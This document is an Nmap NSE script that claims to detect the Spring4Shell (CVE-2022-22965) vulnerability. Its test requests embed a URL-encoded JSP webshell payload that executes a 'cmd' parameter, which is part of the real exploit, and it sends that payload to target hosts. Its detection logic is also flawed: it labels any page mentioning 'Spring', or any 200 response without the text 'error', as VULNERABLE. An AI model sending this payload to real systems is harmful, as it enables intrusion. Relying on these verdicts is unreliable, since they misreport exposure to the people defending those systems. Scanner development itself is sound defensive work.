-- Spring4Shell Detection (CVE-2022-22965)
-- Detects Spring Framework RCE vulnerability
-- @output
-- 8080/tcp open  http
-- | http-spring4shell:
-- |   VULNERABLE: Spring4Shell (CVE-2022-22965)
-- |     Spring Framework RCE detected
-- |_    Class module endpoint accessible

description = [[
Detects Spring4Shell vulnerability (CVE-2022-22965) in Spring Framework.
This RCE vulnerability affects Spring Framework versions 5.3.0 to 5.3.17
and 5.2.0 to 5.2.19 when running on JDK 9+.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "http"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 8080 or port.number == 8443 or port.number == 443
end

action = function(host, port)
    local http = require "http"
    local vulns = {}

    local spring_paths = {"/", "/actuator", "/actuator/env", "/actuator/info"}

    for _, path in ipairs(spring_paths) do
        local response = http.get(host, port, path)
        if response and response.status == 200 and response.body then
            if response.body:find("Whitelabel Error Page") or
               response.body:find("Spring") then
                table.insert(vulns, "Spring application detected on " .. path)
            end
        end
    end

    local test_paths = {
        "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
        "/?class.module.classLoader.DefaultAssertionStatus=nonsense",
    }

    for _, path in ipairs(test_paths) do
        local response = http.get(host, port, path)
        if response and response.status then
            if response.status == 200 and response.body then
                if not response.body:find("error") and not response.body:find("404") then
                    table.insert(vulns, "Spring4Shell indicator: endpoint accepts classLoader params")
                end
            end
        end
    end

    if #vulns > 0 then
        local result = "VULNERABLE: Spring4Shell (CVE-2022-22965)\n"
        result = result .. "  Spring Framework RCE detected\n"
        for _, v in ipairs(vulns) do
            result = result .. "  " .. v .. "\n"
        end
        return result
    end

    return "Not vulnerable to Spring4Shell"
end
